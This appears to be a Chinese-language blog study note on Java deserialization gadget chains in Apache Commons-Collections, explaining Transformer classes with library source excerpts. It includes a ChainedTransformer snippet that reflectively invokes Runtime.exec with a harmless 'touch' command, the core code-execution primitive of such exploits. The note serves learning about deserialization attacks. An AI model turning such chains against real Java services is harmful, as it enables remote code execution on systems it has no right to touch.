<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta name="description" content="前置说明       依据这张图来进行一些分析 参考：Commons-Collections 1-7 利用链分析 – 天下大木头 (wjlshare.com)                      前置知识       CC链包含了好多的Transformer，这部分知识在P神的JAVA安全漫谈中讲的挺清楚的Java安全漫谈 - 09.反序列化篇(3)，">
<meta property="og:type" content="article">
<meta property="og:title" content="JAVA反序列化CC链笔记">
<meta property="og:url" content="http://pig-007.github.io/2022/07/25/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC/index.html">
<meta property="og:site_name" content="PIG-007">
<meta property="og:description" content="前置说明       依据这张图来进行一些分析 参考：Commons-Collections 1-7 利用链分析 – 天下大木头 (wjlshare.com)                      前置知识       CC链包含了好多的Transformer，这部分知识在P神的JAVA安全漫谈中讲的挺清楚的Java安全漫谈 - 09.反序列化篇(3)，">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/DF8C7E9CED07CAD7321EFED262F23E20.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802181051056.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E7%BB%98%E5%9B%BE.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803171708570.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803171741367.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803171936516.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802121441271.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802121635026.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802122031069.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801101348788.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110714702.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802095635405.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802100443587.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802100604384.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802113412874.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802103631920.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802105100090.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802105822797.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802105946768.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806110014361.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806112255293.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806110523351.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803181047725.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803201921921.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803203105622.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110714702.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805162929023.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805165712958.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805170040301.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805170115164.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805170501655.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805170750082.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806110944484.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807120904293.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801095044379.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110613623.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110414584.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110428194.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110714702.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801151544294.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801151900635.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801152047107.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802155244072.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802154737033.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171443518.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171648405.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171743740.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171856068.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171928099.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171953683.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110714702.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801175923980.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806174412815.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806175025930.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802153315688.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807102603926.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807102732158.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807102940029.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807103216037.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807103304810.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807104841649.png">
<meta property="og:image" content="http://pig-007.github.io/AppData/Roaming/Typora/typora-user-images/image-20220807105255253.png">
<meta property="og:image" content="http://pig-007.github.io/AppData/Roaming/Typora/typora-user-images/image-20220807114011896.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807112631117.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807112907832.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807113208463.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807113425973.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807113545609.png">
<meta property="article:published_time" content="2022-07-25T02:25:33.000Z">
<meta property="article:modified_time" content="2022-08-10T06:51:59.867Z">
<meta property="article:author" content="PIG-007">
<meta property="article:tag" content="JAVA反序列化">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/DF8C7E9CED07CAD7321EFED262F23E20.png"><title>JAVA反序列化CC链笔记 | PIG-007</title><link ref="canonical" href="http://pig-007.github.io/2022/07/25/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":true},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">JAVA反序列化CC链笔记</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-07-25</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-08-10</span></span></div></header><div class="post-body">
        <h1 id="前置说明"   >
          <a href="#前置说明" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置说明" class="headerlink" title="前置说明"></a>前置说明</h1>
      <p>依据这张图来进行一些分析</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://wjlshare.com/archives/1535" >Commons-Collections 1-7 利用链分析 – 天下大木头 (wjlshare.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/DF8C7E9CED07CAD7321EFED262F23E20.png" alt="DF8C7E9CED07CAD7321EFED262F23E20"></p>

        <h1 id="前置知识"   >
          <a href="#前置知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1>
      <p>CC链包含了好多的<code>Transformer</code>，这部分知识在<code>P</code>神的<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings" >JAVA安全漫谈</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>中讲的挺清楚的<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wx.zsxq.com/dweb2/index/topic_detail/548841448822424" >Java安全漫谈 - 09.反序列化篇(3)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，简单提一下</p>

        <h2 id="源码-8u40"   >
          <a href="#源码-8u40" class="heading-link"><i class="fas fa-link"></i></a><a href="#源码-8u40" class="headerlink" title="源码-8u40"></a>源码-8u40</h2>
      
        <h2 id="Transformer"   >
          <a href="#Transformer" class="heading-link"><i class="fas fa-link"></i></a><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2>
      <p><code>Transformer</code>是⼀个接⼝，代表调用该对象的<code>transform</code>方法</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function">Object <span class="title">transform</span><span class="params">(Object input)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>很多的<code>transformer</code>系列对象都实现了该接口，并且进行重写，比如熟悉的像<code>InvokerTransformer</code></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125;<span class="keyword">catch</span>&#123;</span><br><span class="line">                <span class="comment">//...</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="TransformedMap"   >
          <a href="#TransformedMap" class="heading-link"><i class="fas fa-link"></i></a><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2>
      <p>借用一下<code>p</code>神在<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings" >JAVA安全漫谈</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>中的<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wx.zsxq.com/dweb2/index/topic_detail/548841448822424" >Java安全漫谈 - 09.反序列化篇(3)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>下的原话</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802181051056.png" alt="image-20220802181051056"></p>
<p>这里的<strong>回调</strong>感觉就是调用对应实现了<code>Transformer</code>接口的类的自定义的<code>transform</code>方法。</p>
<p>其源码如下：</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformedMap</span> <span class="keyword">extends</span> <span class="title">AbstractInputCheckedMapDecorator</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">7023152376788900464L</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer keyTransformer;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>由于其构造函数是<code>protected</code>修饰的，所以通常是没办法在我们的代码中直接实例化对象出来的，那么就利用提供的<code>decorate</code>函数接口即可。</p>

        <h2 id="ConstantTransformer"   >
          <a href="#ConstantTransformer" class="heading-link"><i class="fas fa-link"></i></a><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2>
      <p>看源码就知道</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">6374440726369055124L</span>;</span><br><span class="line">	<span class="comment">//....</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line"></span><br><span class="line"><span class="comment">//....</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>即构造函数的时候传入⼀个对象，当调用<code>transform</code>方法时再将这个对象返回，最开始我想着这不是多此一举吗，有什么用捏。后面才知道，这可能就是为了传递某些无法进行序列化的类吧，比如<code>Runtime</code>的。</p>

        <h2 id="InvokerTransformer"   >
          <a href="#InvokerTransformer" class="heading-link"><i class="fas fa-link"></i></a><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2>
      <p>这个可以说是很关键的一个类了，能执行任意方法。看下源码，主要关注三个参数的构造函数和<code>transform</code>函数。</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">8653385846894047688L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//....</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span>&#123;</span><br><span class="line">                <span class="comment">//.....</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>即当调用到该类的<code>transform</code>函数时，约等于执行<code>input.iMethodName(this.iArgs)</code>。</p>

        <h2 id="ChainedTransformer"   >
          <a href="#ChainedTransformer" class="heading-link"><i class="fas fa-link"></i></a><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2>
      <p>包含了一个<code>Transformer</code>的数组，即数组中前⼀个<code>Transformer</code>的<code>transform</code>函数执行的返回结果，作为后⼀个<code>Transformer</code>的<code>transform</code>函数的参数输入</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">3514945074733160196L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Transformer[] iTransformers;</span><br><span class="line">	<span class="comment">//....</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>比如如下在反序列化中常见的执行<code>Runtime.exec</code>的方法</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">        String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">        Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">        String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;touch dddd&quot;</span>&#125;)&#125;);</span><br><span class="line">chain.transform(<span class="number">123</span>);<span class="comment">//这个123没啥用,随便设置</span></span><br></pre></td></tr></table></div></figure>

<p>那么实际的的调用链如下，实际调试一下应该更清楚一些。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E7%BB%98%E5%9B%BE.png" alt="未命名绘图"></p>
<p>所以通常情况下，我们就是需要找到能调用到某个对象的<code>transform</code>函数的链子。</p>

        <h2 id="TemplatesImpl"   >
          <a href="#TemplatesImpl" class="heading-link"><i class="fas fa-link"></i></a><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2>
      <p>这个不知道被设计出来干啥的，不过在<code>JAVA</code>反序列化中通常用来加载字节码。</p>

        <h3 id="前置知识-1"   >
          <a href="#前置知识-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h3>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wx.zsxq.com/dweb2/index/topic_detail/815544582812412" >Java安全漫谈 - 13.Java中动态加载字节码的那些方法</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
